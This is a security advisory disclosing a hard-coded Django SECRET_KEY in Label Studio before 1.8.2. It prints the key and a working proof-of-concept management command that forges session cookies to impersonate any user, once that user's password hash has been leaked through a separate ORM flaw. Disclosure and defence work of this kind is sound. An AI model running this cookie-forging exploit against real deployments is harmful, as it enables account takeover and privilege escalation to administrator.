# Label Studio has Hardcoded Django `SECRET_KEY` that can be Abused to Forge Session Tokens

**GHSA**: GHSA-f475-x83m-rx5m | **CVE**: CVE-2023-43791 | **Severity**: critical (CVSS 9.8)

**CWE**: CWE-200

**Affected Packages**:
- **label-studio** (pip): < 1.8.2

## Description

# Introduction

This write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.

# Overview

In [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.

However, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.

# Description

Below is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).

```python
# SECURITY WARNING: keep the secret key used in production secret!
SECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'
```

This secret is hard coded across all instances of Label Studio.

# Proof of Concept

Below are the steps that an attacker could do to forge a session token of any account on Label Studio:

1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.

2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.

```python
from typing import Any
from django.core.management.base import  BaseCommand, CommandParser
from django.core import signing
from django.utils.crypto import salted_hmac
from django.conf import settings
import time, uuid

class Command(BaseCommand):
    help = "Forge a users session cookie on Label Studio"

    def add_arguments(self, parser: CommandParser) -> None:
        parser.add_argument(
            '-o', '--organisation',
            help='Organisation ID to access',
            default=1,
            type=int
        )

        parser.add_argument(
            'user_id',
            help='The User ID of the victim you want to impersonate',
            type=str
        )

        parser.add_argument(
            'user_hash',
            help='The password hash the user you want to impersonate'
        )

    def handle(self, *args: Any, **options: Any) -> str | None:
        key = settings.SECRET_KEY
        # Creates the _auth_user_hash HMAC of the victim's password hash
        auth_user_hash = salted_hmac(
            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',
            options['user_hash'],
            secret=key,
            algorithm="sha256"
        ).hexdigest()

        session_dict = {
            'uid': str(uuid.uuid4()), 
            'organization_pk': options['organisation'], 
            'next_page': '/projects/', 
            'last_login': time.time(), 
            '_auth_user_id': options['user_id'], 
            '_auth_user_backend': 
            'django.contrib.auth.backends.ModelBackend', 
            '_auth_user_hash': auth_user_hash, 
            'keep_me_logged_in': True, 
            '_session_expiry': 600
        }

        # Creates a forged session token
        session_token = signing.dumps(
            session_dict,
            key=key,
            salt="django.contrib.sessions.backends.signed_cookies",
            compress=True
        )

        self.stdout.write(
            self.style.SUCCESS(f"session token: {session_token}")
        )
```

3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.

```python
python3 manage.py forgecookie {user_id} '{user_hash}'
```

4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.

# Impact

This vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.

# Remediation Advice

It is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.

We recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.

# Discovered
- August 2023, Robert Schuh, @robbilie
- August 2023, Alex Brown, elttam
